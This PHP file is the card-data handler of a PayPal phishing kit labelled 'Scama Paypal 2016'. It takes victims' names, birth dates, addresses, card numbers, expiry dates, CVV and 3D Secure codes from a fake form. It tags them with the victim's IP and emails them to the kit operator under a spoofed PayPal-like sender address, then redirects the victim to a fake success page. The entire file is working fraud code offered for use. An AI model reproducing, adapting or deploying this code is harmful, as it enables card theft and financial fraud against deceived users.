<?php
//////////////////////////////////////////////////////////////////////////////
//                                                                          //
//         Assalamu Aleikom : Scama Paypal 2016                             //
//                                                                          //
//   Coded By Nabil Tn & Devlopped By Noureddine ElmGhreBi                  //
//                                                                          //
// For Email OPen config.php And change islam@state.yes To your account     //
//                                                                          //
//  Youtube : https://www.youtube.com/channel/UCF_7-Bq6wfs-f4R0avbLUQg/      //
//                                                                          //
// Facebook : https://www.facebook.com/Nour.Blog1                           //
//                                                                          //
//  WebSite : http://nourblog1.blogspot.com/                                //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$Country = $_POST['nabil-country'];
include ('config.php');		
$nab .= "===========[ CC + Billing Infos full ]=========\n";  #
$nab .= "Frist name  : ".$_POST['nabil-fn']."\n";             #
$nab .= "Last  name  : ".$_POST['nabil-ln']."\n";             #
$nab .= "Date  Birth : ".$_POST['nabil-bir']."\n";            #
$nab .= "Address ln  : ".$_POST['nabil-ad-2']."\n";           #
$nab .= "City        : ".$_POST['nabil-city']."\n";           # 
$nab .= "Country     : ".$_POST['nabil-country']."\n";        #
$nab .= "Zîp Code    : ".$_POST['nabil-zip']."\n";            #
$nab .= "Card number : ".$_POST['nabil-card']."\n";           #
$nab .= "Xpiration date : ".$_POST['nabil-ex']."\n";          #
$nab .= "ccv         : ".$_POST['nabil-ccv']."\n";            #
$nab .= "3D secure   : ".$_POST['nabil-3D']."\n";             #
$nab .= "========================[IP]=====================\n";#  
$nab .= "IP	: http://www.geoiptool.com/?IP=$ip\n";            #
$nab .= "==========[More Tools : Www.zenstack.eu/spider-maghreb ]=========\n";#

$subject = "-| =?utf-8?q?=F0=9F=92=B0?= CC + Billing infos =?utf-8?q?=F0=9F=92=B0?= | $Country | {$ip} |-";
$headers = "From:Result ^^  <paypal@supprot.com>";

mail($to, $subject, $nab,$headers);


header("Location:websc_succes.php?cmd=_flow&SESSION=succes_update_account_pH3fLzMHurkmQkjR59m8RQPT7uSS_4LsFtrCI149xUdAdboe9F46S&dispatch=5885d80a13c0db1f8e263663d3faee8d5c97cbf3d75cb63effe5661cdf3adb6d");


?>